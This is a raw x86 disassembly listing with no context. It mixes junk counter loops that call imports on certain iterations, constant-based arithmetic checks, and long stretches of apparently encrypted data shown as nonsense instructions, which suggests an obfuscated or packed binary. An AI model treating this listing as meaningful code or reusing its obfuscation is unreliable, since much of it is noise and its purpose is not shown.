  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433757,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x433757
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433757,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433757
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433757,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	popf   
  407c4b:	fwait
  407c4c:	pusha  
  407c4d:	aam    0x2b
  407c4f:	int3   
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x937e7e7c
  407c57:	cs stos DWORD PTR es:[edi],eax
  407c59:	push   esi
  407c5a:	mov    al,0xda
  407c5c:	ss xchg edi,eax
  407c5e:	lea    ebp,[eax+0x471db19c]
  407c64:	pop    eax
  407c65:	rcl    DWORD PTR [edi-0x4],0xda
  407c69:	xchg   esp,eax
  407c6a:	mov    edi,0x9f99393a
  407c6f:	xchg   ebx,eax
  407c70:	mov    dl,0x5e
  407c73:	call   0xb5121732
  407c78:	inc    esp
  407c79:	nop
  407c7a:	jg     0x407c4d
  407c7c:	mov    dh,0x84
  407c7e:	inc    esp
  407c7f:	xchg   DWORD PTR [esi-0x71],ebx
  407c82:	lods   eax,DWORD PTR cs:[esi]
  407c84:	fnstenv [ebx]
  407c86:	out    dx,al
  407c87:	shl    BYTE PTR [esi-0x60de221b],0xec
  407c8e:	mov    ds:0x7c34df90,al
  407c93:	jnp    0x407c70
  407c95:	in     eax,0x7
  407c97:	rcr    BYTE PTR [ebx+0xc],cl
  407c9a:	clc    
  407c9b:	xchg   bh,bl
  407c9d:	mov    eax,ds:0xbad77e1b
  407ca2:	or     eax,0x869d65c3
  407ca7:	mov    edi,0x38898181
  407cac:	imul   ebx
  407cae:	xchg   ebp,edi
  407cb0:	pop    ebp
  407cb1:	xor    BYTE PTR [eax-0x1a497c84],0x7f
  407cb8:	inc    ecx
  407cb9:	ror    DWORD PTR [ebx-0xf],1
  407cbc:	dec    ecx
  407cbd:	pop    esp
  407cbe:	(bad)  [edi+0x74318ecc]
  407cc4:	sbb    al,dh
  407cc6:	or     bl,BYTE PTR [ebx]
  407cc8:	stos   BYTE PTR es:[edi],al
  407cc9:	or     DWORD PTR [edx+0x7257d7c5],0xe368f85c
  407cd3:	pop    ecx
  407cd4:	stos   DWORD PTR es:[edi],eax
  407cd5:	fsubp  st(1),st
  407cd7:	fbld   TBYTE PTR [ecx-0x20]
  407cda:	sar    DWORD PTR [esp+ecx*8+0x24a13ebf],cl
  407ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ce2:	mov    eax,0xbfb42083
  407ce7:	add    BYTE PTR [ebx+edi*2],cl
  407cea:	pop    edi
  407ceb:	pop    eax
  407cec:	stc    
  407ced:	test   eax,0x9a8f0c7e
  407cf2:	mov    al,BYTE PTR [ecx-0x3d]
  407cf5:	jno    0x407cd1
  407cf7:	sbb    DWORD PTR [eax+0x7b97cdea],ebx
  407cfd:	mov    cs,WORD PTR [ebx+0x3190158d]
  407d03:	rcr    BYTE PTR [edx],0x1c
  407d06:	(bad)  [edi]
  407d08:	fidiv  DWORD PTR [eax]
  407d0a:	lds    eax,FWORD PTR [edi-0x3b291845]
  407d10:	out    0x4e,al
  407d12:	mov    eax,ds:0xd8382333
  407d17:	mov    ds:0x43066bfc,eax
  407d1c:	fiadd  WORD PTR [ecx+0x66]
  407d1f:	aam    0xa
  407d21:	xchg   esi,eax
  407d22:	or     eax,DWORD PTR [edx]
  407d24:	push   es
  407d25:	dec    ebx
  407d26:	push   ss
  407d27:	bound  esi,QWORD PTR [ebx]
  407d29:	daa    
  407d2a:	mov    eax,0xcd85208c
  407d2f:	shl    DWORD PTR [ebx+eiz*4-0x38b29d07],0x9d
  407d37:	pop    ds
  407d38:	and    eax,0xb243e7d1
  407d3d:	iret   
  407d3e:	jecxz  0x407cd5
  407d40:	rol    DWORD PTR [edi+0x5e],cl
  407d43:	add    edi,DWORD PTR [esi-0x7829d2e4]
  407d49:	repnz push eax
  407d4b:	inc    edx
  407d4c:	mov    ah,0xf6
  407d4e:	push   edx
  407d4f:	popf   
  407d50:	mov    eax,DWORD PTR [ebx+ebx*2+0x22]
  407d54:	mov    dl,0xf3
  407d56:	inc    edx
  407d57:	and    al,0xb0
  407d59:	xchg   ebx,eax
  407d5a:	pop    ds
  407d5b:	retf   0xc59e
  407d5e:	loope  0x407cfd
  407d60:	std    
  407d61:	bound  edi,QWORD PTR [ecx]
  407d63:	data16 fwait
  407d65:	push   0xffffff8c
  407d67:	out    0xc8,al
  407d69:	outs   dx,DWORD PTR ds:[esi]
  407d6a:	stos   BYTE PTR es:[edi],al
  407d6b:	add    edi,DWORD PTR [ebp+0x7d]
  407d6e:	out    dx,eax
  407d6f:	pop    es
  407d70:	pop    ds
  407d71:	jmp    edx
  407d73:	fistp  WORD PTR [edx-0x3a]
  407d76:	ficom  WORD PTR [edx+0x3e]
  407d79:	retf   
  407d7a:	xor    edi,DWORD PTR [ebx-0x20]
  407d7d:	mov    ebp,0xd0e40cc4
  407d82:	jb     0x407da2
  407d84:	fs ret 
  407d86:	mov    cl,0xb1
  407d88:	sub    al,0x62
  407d8a:	scas   eax,DWORD PTR es:[edi]
  407d8b:	jno    0x407d50
  407d8d:	int3   
  407d8e:	jp     0x407df5
  407d90:	idiv   BYTE PTR [esp+ebx*1]
  407d93:	out    dx,al
  407d94:	pusha  
  407d95:	inc    ebx
  407d96:	dec    BYTE PTR [esi+0x56]
  407d99:	dec    ecx
  407d9a:	or     al,0xcd
  407d9c:	pop    edi
  407d9d:	inc    ecx
  407d9e:	mov    BYTE PTR [ebp-0x29],dh
  407da1:	ret    0xcc29
  407da4:	lods   al,BYTE PTR ds:[esi]
  407da5:	or     ebx,DWORD PTR gs:[ebp+0x3953c445]
  407dac:	inc    esp
  407dad:	fld    DWORD PTR [edi]
  407daf:	cmp    DWORD PTR [eax+0x6a3380c7],0xffffffe7
  407db6:	into   
  407db7:	xor    eax,0xf9438145
  407dbc:	mov    esp,esp
  407dbe:	mov    ds:0xe3c0a35,eax
  407dc3:	xchg   ebx,eax
  407dc4:	sbb    BYTE PTR [eax-0x7a],dl
  407dc7:	xor    BYTE PTR [edi-0x35],0x24
  407dcb:	retf   0xcd01
  407dce:	and    eax,DWORD PTR [ecx+0x3b76c4ae]
  407dd4:	inc    ecx
  407dd5:	adc    esp,DWORD PTR [edx-0x32]
  407dd8:	imul   BYTE PTR [edi]
  407dda:	aaa    
  407ddb:	xchg   edi,eax
  407ddc:	mov    al,ds:0xd1f48a24
  407de1:	mov    edi,0x9a5bf24b
  407de6:	ficom  DWORD PTR [edi+0x33]
  407de9:	out    dx,eax
  407dea:	and    dl,BYTE PTR [ecx]
  407dec:	add    BYTE PTR [ebp+esi*2-0x1a75ca81],ah
  407df3:	sbb    dh,al
  407df5:	popf   
  407df6:	xchg   ecx,eax
  407df7:	inc    ebp
  407df8:	xor    ecx,DWORD PTR [eax]
  407dfa:	jl     0x407de9
  407dfc:	test   DWORD PTR [esi-0x8a4eda7],edi
  407e02:	aam    0x13
  407e04:	pop    es
  407e05:	push   ebp
  407e06:	retf   
  407e07:	test   BYTE PTR [bp+si],ch
  407e0a:	sbb    DWORD PTR [ebp+0x56],ebp
  407e0d:	ds ja  0x407dbe
  407e10:	push   es
  407e11:	cmc    
  407e12:	mov    cl,0x20
  407e14:	push   es
  407e15:	ret    
  407e16:	or     dl,cl
  407e18:	in     eax,dx
  407e19:	arpl   WORD PTR [ebx-0x536d2190],bp
  407e1f:	add    ah,BYTE PTR [esi]
  407e21:	pop    ebp
  407e22:	or     DWORD PTR [si-0x80],esp
  407e26:	dec    esi
  407e27:	sub    BYTE PTR [ecx+0x2f3b57b9],al
  407e2d:	fstp   DWORD PTR ds:0x1aeb215c
  407e33:	pop    ecx
  407e34:	loopne 0x407e71
  407e36:	int    0x3f
  407e38:	inc    ebp
  407e39:	mov    ebx,ss
  407e3b:	xor    ah,BYTE PTR [ebp+0x4e]
  407e3e:	mov    eax,ds:0x8ce61c27
  407e43:	dec    ebp
  407e44:	cdq    
  407e45:	xchg   edx,eax
  407e46:	xlat   BYTE PTR ds:[ebx]
  407e47:	cwde   
  407e48:	mov    ch,0x62
  407e4a:	cmp    ch,BYTE PTR [edi+0x77]
  407e4d:	add    eax,0xba254d41
  407e52:	sbb    eax,DWORD PTR [ebx]
  407e54:	or     bh,BYTE PTR [ebp+0x4d073e73]
  407e5a:	scas   eax,DWORD PTR es:[edi]
  407e5b:	push   0xf2898e9b
  407e60:	xchg   BYTE PTR [ecx-0xbba74f0],cl
  407e66:	cmp    eax,0x823721f2
  407e6b:	je     0x407e88
  407e71:	mov    eax,DWORD PTR [ebp-0x1c]
  407e74:	or     DWORD PTR [eax],0x60751c9e
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43376b
  407f81:	or     DWORD PTR ds:0x43376f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4337d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4337d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43381b
  407fad:	sub    DWORD PTR ds:0x4337a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43375b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4337ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4337ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4337ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4337ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4337ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4339e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4337ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4337ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4337ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4337ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4337ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4337ab,ebx
  408048:	cmp    DWORD PTR ds:0x4337ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4337ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4337ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4337ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4337ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4336fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4337db
  4080b1:	and    DWORD PTR ds:0x4337e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43379b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433823,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433823
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433823,ebx
  4080e3:	cmp    DWORD PTR ds:0x433823,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4337db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433823,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433823
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433823,ebx
  40811d:	cmp    DWORD PTR ds:0x433823,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433817,0x1f
  40813b:	cmp    DWORD PTR ds:0x433817,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433817,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433817
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433817,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x9926830d
  408191:	(bad)  
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	inc    esp
  40819b:	sub    DWORD PTR [edx-0x168e97b1],ebx
  4081a1:	mov    esi,0xd50a3226
  4081a6:	push   esp
  4081a7:	jo     0x4081fa
  4081a9:	adc    eax,0x1d4e3d08
  4081ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081af:	pop    ebp
  4081b0:	sbb    BYTE PTR [esi+0x1a9fe2c4],bh
  4081b6:	daa    
  4081b7:	xor    al,0xa7
  4081b9:	sti    
  4081ba:	sbb    eax,0x475b1eda
  4081bf:	mov    edi,0x89188406
  4081c4:	cdq    
  4081c5:	imul   ebp,ecx,0x14
  4081c8:	xor    bh,ah
  4081ca:	and    WORD PTR [eax+0x16],dx
  4081ce:	dec    eax
  4081cf:	fcmovb st,st(4)
  4081d1:	pop    ecx
  4081d2:	lods   eax,DWORD PTR ds:[esi]
  4081d3:	xchg   ebp,eax
  4081d4:	sbb    eax,ebx
  4081d6:	sub    ecx,ebp
  4081d8:	jmp    0x408175
  4081da:	fwait
  4081db:	iret   
  4081dc:	push   esp
  4081dd:	jp     0x4081fd
  4081df:	sub    eax,0x44807e7a
  4081e4:	je     0x40818c
  4081e6:	mov    bl,0xde
  4081e8:	cld    
  4081e9:	mov    dh,0xc7
  4081eb:	jmp    0x408185
  4081ed:	dec    ecx
  4081ee:	shl    BYTE PTR [edi+0x5a44a346],0x27
  4081f5:	mov    BYTE PTR [ecx+0xb],0x65
  4081f9:	and    ecx,DWORD PTR [edx+eiz*2]
  4081fc:	scas   eax,DWORD PTR es:[edi]
  4081fd:	popf   
  4081fe:	mov    al,0xe9
  408200:	lods   eax,DWORD PTR ds:[esi]
  408201:	inc    eax
  408202:	shl    BYTE PTR [eax+ebx*4+0x47],0x4c
  408207:	mov    eax,0x19738d58
  40820c:	sti    
  40820d:	outs   dx,BYTE PTR ds:[esi]
  40820e:	cmp    cl,BYTE PTR [edi]
  408210:	xor    eax,0x5f5a1a68
  408215:	data16 xchg BYTE PTR [edi+0xf],ah
  408219:	rol    DWORD PTR [edi+esi*2],1
  40821c:	pop    edi
  40821d:	jecxz  0x408295
  40821f:	push   ebp
  408220:	cli    
  408221:	lds    eax,FWORD PTR ds:0xe966a916
  408227:	add    eax,0x832241ac
  40822c:	mov    gs,WORD PTR [ebp+0x2a]
  40822f:	add    esi,DWORD PTR ds:0xddd2150
  408235:	loope  0x4081ff
  408237:	mov    DWORD PTR [esi+ebp*2],edi
  40823a:	inc    eax
  40823b:	jae    0x40825d
  40823d:	dec    eax
  40823e:	mov    esi,0xcdeb3e72
  408243:	mov    eax,DWORD PTR [eax-0x46]
  408246:	dec    ebx
  408247:	push   ds
  408248:	jp     0x408264
  40824a:	ss sahf 
  40824c:	cli    
  40824d:	mul    BYTE PTR [ebx]
  40824f:	add    DWORD PTR [edx+edi*4+0x3345cbad],ebp
  408256:	adc    bh,dl
  408258:	pushf  
  408259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40825a:	sti    
  40825b:	or     edx,edx
  40825d:	ss loopne 0x408270
  408260:	test   DWORD PTR [ebp-0x59308489],ecx
  408266:	repnz aad 0xd9
  408269:	adc    al,0xac
  40826b:	mov    esp,0xa15dd368
  408270:	mov    bh,0xcb
  408272:	out    dx,al
  408273:	retf   0x28c6
  408276:	(bad)  
  408277:	cld    
  408278:	inc    esp
  408279:	repz leave 
  40827b:	cwde   
  40827c:	push   ebp
  40827d:	mov    ebx,0x65e11d6c
  408282:	clc    
  408283:	les    ebx,FWORD PTR [esi+ebp*2]
  408286:	jg     0x4082d6
  408288:	stos   BYTE PTR es:[edi],al
  408289:	cmp    ch,BYTE PTR [ecx]
  40828b:	stos   DWORD PTR es:[edi],eax
  40828c:	pop    edi
  40828d:	js     0x40821b
  40828f:	cmovne ebx,DWORD PTR [ebx-0x640ab58e]
  408296:	pop    ss
  408297:	ss jmp 0xf7fb:0x4204f0e0
  40829f:	xchg   BYTE PTR [edx+0x45fe0d6e],dh
  4082a5:	rol    dh,1
  4082a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082a8:	sbb    DWORD PTR [edx-0x5a],ebp
  4082ab:	dec    ebx
  4082ac:	int    0xae
  4082ae:	push   0xe3117c48
  4082b3:	std    
  4082b4:	pop    ebp
  4082b5:	adc    cl,BYTE PTR [esi-0x2d]
  4082b8:	push   ebx
  4082b9:	add    DWORD PTR [ebp+ecx*4+0x6b],ebx
  4082bd:	or     DWORD PTR [esi],ebp
  4082bf:	xchg   ebx,eax
  4082c0:	inc    ebp
  4082c1:	jp     0x408243
  4082c3:	test   eax,0x5d9c31fe
  4082c8:	mov    ds:0x8e4d86fb,al
  4082cd:	sub    ebx,esp
  4082cf:	arpl   dx,di
  4082d1:	jb     0x40833e
  4082d3:	sahf   
  4082d4:	dec    edi
  4082d5:	jae    0x408300
  4082d7:	lods   eax,DWORD PTR ds:[esi]
  4082d8:	mov    eax,0xf558f26e
  4082dd:	stc    
  4082de:	push   edi
  4082df:	inc    esi
  4082e0:	sbb    DWORD PTR [edx+0x1c2392d3],esp
  4082e6:	fiadd  WORD PTR [esi-0x5061653e]
  4082ec:	hlt    
  4082ed:	scas   eax,DWORD PTR es:[edi]
  4082ee:	sub    ebp,DWORD PTR [edx+0x33f8af44]
  4082f4:	ja     0x40830d
  4082f6:	or     DWORD PTR [ebx+edx*1-0x67eedcfa],esp
  4082fd:	ret    0x5c86
  408300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408301:	(bad)  
  408302:	xor    ch,BYTE PTR [eax]
  408304:	sbb    al,0xba
  408306:	pop    eax
  408307:	enter  0x908a,0x65
  40830b:	cmc    
  40830c:	rcl    dh,1
  40830e:	dec    ecx
  40830f:	test   al,0x61
  408311:	call   0x5eeb:0x5f378c3c
  408318:	clc    
  408319:	inc    eax
  40831a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40831b:	fmul   st(1),st
  40831d:	(bad)  
  40831e:	xor    ebp,DWORD PTR [eax-0x1301871]
  408324:	pop    ecx
  408325:	mov    ds:0x4af3321e,eax
  40832a:	and    dl,BYTE PTR ds:0x40aa269f
  408330:	mov    edx,0xd311b852
  408335:	xor    BYTE PTR [ecx-0x62],cl
  408338:	push   edi
  408339:	in     al,0x8c
  40833b:	inc    ecx
  40833c:	retf   
  40833d:	dec    edx
  40833e:	cld    
  40833f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408340:	xchg   edi,eax
  408341:	pushf  
  408342:	dec    ebx
  408343:	ja     0x40833e
  408345:	daa    
  408346:	mov    ?,ebp
  408348:	icebp  
  408349:	(bad)  
  40834a:	bound  eax,QWORD PTR [ecx+esi*8+0x268df64f]
  408351:	in     eax,0xee
  408353:	and    BYTE PTR [edx],ah
  408355:	stos   DWORD PTR es:[edi],eax
  408356:	inc    ebx
  408357:	or     BYTE PTR [ebx+0x4e130ff0],0x41
  40835e:	ins    DWORD PTR es:[edi],dx
  40835f:	cmp    eax,0x11429588
  408364:	test   BYTE PTR [ebp+0x5],0x32
  408368:	mov    ecx,0xc3a8fdd6
  40836d:	(bad)  
  40836f:	stc    
  408370:	mov    eax,0x429782c2
  408375:	inc    esi
  408376:	jp     0x40833e
  408378:	jl     0x408323
  40837a:	lods   eax,DWORD PTR ds:[esi]
  40837b:	loop   0x40835b
  40837d:	data16 cmc 
  40837f:	push   ss
  408380:	aaa    
  408381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408382:	pop    edi
  408383:	xor    dh,BYTE PTR [ebx+0xc]
  408386:	imul   eax,edi,0x3d
  408389:	inc    esp
  40838a:	outs   dx,DWORD PTR ds:[esi]
  40838b:	xor    eax,0x9d51245c
  408390:	push   0xb9978fea
  408395:	or     eax,DWORD PTR [eax+0x5]
  408398:	pop    ecx
  408399:	and    edx,DWORD PTR [ebx+ebp*8-0x25e21cbe]
  4083a0:	dec    ecx
  4083a1:	cmp    ecx,DWORD PTR [ecx+0x5c78eb98]
  4083a7:	push   ebp
  4083a8:	pop    ecx
  4083a9:	mov    al,0x8c
  4083ab:	repz jle 0x408393
  4083ae:	inc    esp
  4083af:	loope  0x408369
  4083b1:	and    eax,0xbc844d8d
  4083b6:	cld    
  4083b7:	add    eax,0x7105d7de
  4083bc:	push   ebx
  4083bd:	mov    BYTE PTR ds:0x6071c485,ch
  4083c3:	push   ds
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43375b,0x0
  4083d1:	mov    eax,ds:0x43375b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43375b,eax
  4083dc:	cmp    DWORD PTR ds:0x43375b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43375b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43375b
  40840c:	inc    eax
  40840d:	mov    ds:0x43375b,eax
  408412:	cmp    DWORD PTR ds:0x43375b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43370b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433713,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433827
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	loope  0x4084bb
  408466:	push   ss
  408467:	add    esp,esp
  408469:	enter  0x7e7e,0x24
  40846d:	jl     0x4084ed
  40846f:	jle    0x408499
  408471:	(bad)  
  408472:	lods   eax,DWORD PTR ds:[esi]
  408473:	outs   dx,BYTE PTR ds:[esi]
  408474:	pop    eax
  408475:	dec    edx
  408476:	rcl    DWORD PTR [esi-0xbc27677],1
  40847c:	popf   
  40847d:	fs dec edi
  40847f:	retf   
  408480:	mov    ds:0xf7f9ff8a,al
  408485:	inc    edx
  408486:	and    cl,ah
  408488:	iret   
  408489:	cs sbb esp,eax
  40848c:	and    bl,BYTE PTR [ecx-0x6d]
  40848f:	pop    esi
  408490:	fimul  WORD PTR [edi]
  408492:	add    al,0x58
  408494:	adc    al,0x6b
  408496:	fstp   QWORD PTR [edx]
  408498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408499:	xchg   BYTE PTR [eax-0x345296b2],cl
  40849f:	sahf   
  4084a0:	or     dl,BYTE PTR [edx+eiz*2-0x74]
  4084a4:	(bad)  
  4084a5:	lods   eax,DWORD PTR ds:[esi]
  4084a6:	retf   
  4084a7:	adc    edx,esp
  4084a9:	loopne 0x4084e5
  4084ab:	and    dh,BYTE PTR [ebx-0x1ae85668]
  4084b1:	retf   0x9807
  4084b4:	mov    DWORD PTR [esi+0x278495a],esp
  4084ba:	faddp  st(3),st
  4084bc:	shl    BYTE PTR [ecx-0x1362f37c],cl
  4084c2:	ins    BYTE PTR es:[edi],dx
  4084c3:	in     eax,dx
  4084c4:	push   esi
  4084c5:	add    bl,BYTE PTR [edx]
  4084c7:	sahf   
  4084c8:	add    edx,esp
  4084ca:	popa   
  4084cb:	cld    
  4084cc:	into   
  4084cd:	push   esi
  4084ce:	nop
  4084cf:	xor    al,0x85
  4084d1:	cmp    edi,DWORD PTR [esp]
  4084d4:	mov    bl,bh
  4084d6:	xor    ebp,DWORD PTR [ebx+0x44]
  4084d9:	loop   0x40847d
  4084db:	push   cs
  4084dc:	sub    al,BYTE PTR [ecx]
  4084de:	mov    ebp,0x26e279c2
  4084e3:	in     al,0xf2
  4084e5:	js     0x408506
  4084e7:	mov    bl,0xc6
  4084e9:	call   0xdad91ceb
  4084ee:	fmul   st(5),st
  4084f0:	rol    DWORD PTR ds:0x5663f019,cl
  4084f6:	cdq    
  4084f7:	test   DWORD PTR [ebx],eax
  4084f9:	jbe    0x408507
  4084fb:	cdq    
  4084fc:	mov    edx,esp
  4084fe:	mov    ah,0x22
